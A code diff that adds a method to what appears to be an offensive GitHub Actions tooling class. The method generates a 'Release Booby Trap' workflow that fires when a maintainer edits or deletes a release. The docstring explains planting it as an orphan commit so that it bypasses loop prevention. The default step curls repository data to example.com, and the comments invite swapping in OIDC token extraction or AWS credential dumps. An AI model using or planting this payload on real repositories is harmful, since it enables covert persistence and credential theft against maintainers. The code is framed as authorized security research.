@@ -173,3 +173,64 @@ fi
         yaml_file["jobs"] = {"testing": test_job}
 
         return yaml.dump(yaml_file, sort_keys=False, default_style="", width=4096)
+
+    @staticmethod
+    def create_release_booby_trap_payload(
+        exfil_sink: str | None = None,
+        permissions: dict | None = None,
+    ):
+        """Create a Release Booby Trap workflow payload for security testing.
+
+        This payload triggers on ``release: [edited, deleted]`` and executes a
+        configurable exfiltration step. When planted via the Git Data API as an
+        orphan commit behind a release, it fires when a non-bot actor (e.g. a
+        human maintainer) interacts with the release — bypassing GitHub's loop
+        prevention.
+
+        Reference: https://github.com/Dev11940518/release-bomb-demo
+
+        Args:
+            exfil_sink: Shell command to run when the trap fires.
+                Defaults to a benign echo + curl POST to example.com.
+                Replace with a real exfiltration sink (e.g. OIDC token
+                extraction, AWS credential dump) during authorized testing.
+            permissions: Workflow-level permissions dict.
+                Defaults to ``{id-token: write, contents: read}`` for
+                OIDC abuse demonstration.
+
+        Returns:
+            str: YAML content of the booby trap workflow.
+
+        Note:
+            This is for security research, vulnerability assessment, and
+            educational purposes only. Should not be used maliciously.
+        """
+        if permissions is None:
+            permissions = {"id-token": "write", "contents": "read"}
+
+        if exfil_sink is None:
+            exfil_sink = (
+                'echo "[BOOBY_TRAP] detonated — '
+                "release booby trap fired\"\n"
+                "# Replace this sink with OIDC token extraction, secret"
+                " exfiltration, etc.\n"
+                "# See bomb.yml in pocs/release-booby-trap/ for"
+                " documented examples.\n"
+                'curl -s -X POST https://example.com/booby-trap-detonated '
+                '-d "repo=${{ github.repository }}&release=${{ github.event.release.tag_name }}" '
+                '> /dev/null 2>&1 || true'
+            )
+
+        yaml_file = {
+            "name": "Release Booby Trap",
+            "on": {"release": {"types": ["edited", "deleted"]}},
+            "jobs": {
+                "fire": {
+                    "permissions": permissions,
+                    "runs-on": "ubuntu-latest",
+                    "steps": [{"run": exfil_sink}],
+                }
+            },
+        }
+
+        return yaml.dump(yaml_file, sort_keys=False, default_style="", width=4096)
